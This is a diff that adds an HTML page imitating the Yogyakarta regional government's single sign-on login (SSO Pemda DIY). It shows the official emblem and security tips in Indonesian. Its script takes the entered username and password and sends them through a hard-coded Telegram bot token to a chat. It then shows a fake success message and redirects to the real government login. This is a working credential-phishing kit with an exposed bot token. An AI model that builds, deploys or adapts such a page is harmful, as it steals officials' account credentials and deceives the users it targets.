@@ -1,0 +1,89 @@
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>SSO Pemda DIY</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+  <div class="w-screen h-screen bg-white shadow-lg flex flex-col md:flex-row">
+    <!-- Bagian Form Login -->
+    <div class="w-full md:w-1/2 p-8 flex flex-col justify-center">
+      <h1 class="text-lg text-blue-800 mb-4 text-left">SSO Pemda DIY</h1>
+      <div class="flex justify-center mb-6">
+        <img alt="Government emblem with a star, leaves, and a red circle with a white monument in the center"
+             height="100" src="https://storage.googleapis.com/a1aa/image/Kf3DE8NoC0CFVd_xCpKqHnsldUpVIEtk_S7EOpDhoeI.jpg" width="100"/>
+      </div>
+      <form id="loginForm">
+        <label class="block text-blue-800 mb-2" for="username">USERNAME OR EMAIL</label>
+        <input class="w-full p-3 mb-4 border rounded" id="username" name="username" type="text" placeholder="Masukkan Username atau Email"/>
+        <label class="block text-blue-800 mb-2" for="password">PASSWORD</label>
+        <input class="w-full p-3 mb-4 border rounded" id="password" name="password" type="password" placeholder="Masukkan Password"/>
+        <div class="flex items-center mb-4">
+          <input class="mr-2" id="remember" name="remember" type="checkbox"/>
+          <label class="text-blue-800" for="remember">Remember me</label>
+        </div>
+        <button class="w-full bg-blue-800 text-white p-3 rounded hover:bg-blue-900" type="submit">PROSES</button>
+      </form>
+    </div>
+    <!-- Bagian Informasi -->
+    <div class="w-full md:w-1/2 bg-blue-800 text-white p-8 flex flex-col justify-center">
+      <h2 class="text-3xl font-bold mb-6">Selamat Datang di SSO Pemda DIY</h2>
+      <ul class="list-disc list-inside space-y-4 text-lg">
+        <li>Jaga kerahasiaan akun Anda dan tidak membagikan password kepada orang lain.</li>
+        <li>Selalu mengganti password Anda secara berkala.</li>
+        <li>
+          Gunakan kombinasi huruf besar, huruf kecil, angka, dan simbol untuk keamanan maksimal.
+        </li>
+        <li>
+          Panduan 2FA (Mobile Authenticator) dapat dilihat pada link berikut: 
+          <a class="underline hover:text-blue-400" href="#">klik di sini</a>
+        </li>
+        <li>
+          Jika Anda mengalami kesulitan dalam proses login, silakan hubungi kami via Discord: 
+          <a class="underline hover:text-blue-400" href="#">klik di sini</a>
+        </li>
+      </ul>
+      <footer class="mt-15 text-right text-sm">
+        Diskominfo DIY - @2024
+      </footer>
+    </div>
+  </div>
+<!-- Kirim ke Telegram -->
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!username || !password) {
+        alert("Username dan Password tidak boleh kosong!");
+        return;
+      }
+
+      const botToken = '7930328920:AAEgKFP5pbhl7B7erhWAjdxuDMs9AWSVCm8';
+      const chatId = '6275539704';
+      const message = `SSO Pemda DIY Username: ${username}\nPassword: ${password}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            alert('Berhasil Login');
+            window.location.href = "https://jogjaprov.go.id/login";
+          } else {
+            alert('Gagal Login');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('Error sending data to Telegram.');
+        });
+    });
+  </script>
+</body>
+</html>
